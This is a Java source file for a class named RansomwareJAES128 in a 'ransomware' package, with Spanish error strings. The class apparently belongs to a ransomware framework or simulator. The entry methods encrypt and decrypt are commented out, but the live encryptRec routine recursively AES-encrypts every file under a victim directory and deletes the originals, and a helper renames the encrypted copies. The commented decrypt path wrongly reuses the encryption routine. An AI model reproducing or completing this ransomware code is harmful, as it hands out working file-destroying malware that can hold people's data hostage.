package ransomware;

import com.google.gson.annotations.Expose;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class RansomwareJAES128 extends Ransomware {

    private transient Cipher cipher;
    private transient String victimDir;

    public RansomwareJAES128(int id, String nombre, String descripcion) {
        super(id, nombre, descripcion);
    }

    @Override
    public Process encrypt(String victimDir) throws Exception {
//        this.victimDir = victimDir;
//        String algorithm = "AES";
//        String clearText = super.getParametros().get("clave");
//        if (clearText == null) {
//            throw new RuntimeException("No se especificó una clave");
//        }
//        byte[] key = clearText.getBytes("UTF8");
//        SecretKey secretKey = new SecretKeySpec(key, "AES");
//        cipher = Cipher.getInstance(algorithm);
//        int mode = Cipher.ENCRYPT_MODE;
//        cipher.init(mode, secretKey);
//
//        File file = new File(victimDir);
//        if (file.exists()) {
//            encryptRec(file);
//        } else {
//            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
//        }
//        removeTemporalFileExtension(file);
        return null;
    }

    /**
     * This method encrypts a directory and all subdirectories and files from
     * it.
     *
     * @param file
     */
    private void encryptRec(File file) throws Exception {
        if (file.isDirectory()) {
            File files[] = file.listFiles();
            for (File a : files) {
                encryptRec(a);
                a.delete();
            }
        } else {
            FileInputStream fis = new FileInputStream(file);
            int readBytesCount;
            FileOutputStream fos = new FileOutputStream(new File(file.getAbsolutePath() + ".tmp"));

            int inputBlockSize = cipher.getBlockSize();
            int outputBlockSize = cipher.getOutputSize(inputBlockSize);
            byte[] inputBytes = new byte[inputBlockSize];
            byte[] outputBytes = new byte[outputBlockSize];

            do {
                readBytesCount = fis.read(inputBytes);
                if (readBytesCount == inputBlockSize) {
                    int writeBytesCount = cipher.update(inputBytes, 0, inputBlockSize, outputBytes);
                    fos.write(outputBytes, 0, writeBytesCount);
                }
            } while (readBytesCount == inputBlockSize);
            if (readBytesCount > 0) {
                outputBytes = cipher.doFinal(inputBytes, 0, readBytesCount);
            } else {
                outputBytes = cipher.doFinal();
            }
            fos.write(outputBytes);
            fis.close();
            fos.close();
        }
    }

    @Override
    public Process decrypt(String victimDir) throws Exception {
        return null;
//        this.victimDir = victimDir;
//        String algorithm = "AES";
//        String clearText = super.getParametros().get("clave");
//        if (clearText == null) {
//            throw new RuntimeException("No se especificó una clave");
//        }
//        byte[] key = clearText.getBytes("UTF8");
//        SecretKey secretKey = new SecretKeySpec(key, "AES");
//        cipher = Cipher.getInstance(algorithm);
//        int mode = Cipher.DECRYPT_MODE;
//        cipher.init(mode, secretKey);
//
//        File file = new File(victimDir);
//        if (file.exists()) {
//            encryptRec(file);
//        } else {
//            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
//        }
//        removeTemporalFileExtension(file);
    }

    private void removeTemporalFileExtension(File file) throws Exception {
        if (file.isDirectory()) {
            File files[] = file.listFiles();
            for (File a : files) {
                removeTemporalFileExtension(a);
            }
        } else {
            int p = file.getAbsolutePath().lastIndexOf(".");
            String e = file.getAbsolutePath().substring(0, p);
            file.renameTo(new File(e));
        }
    }
}
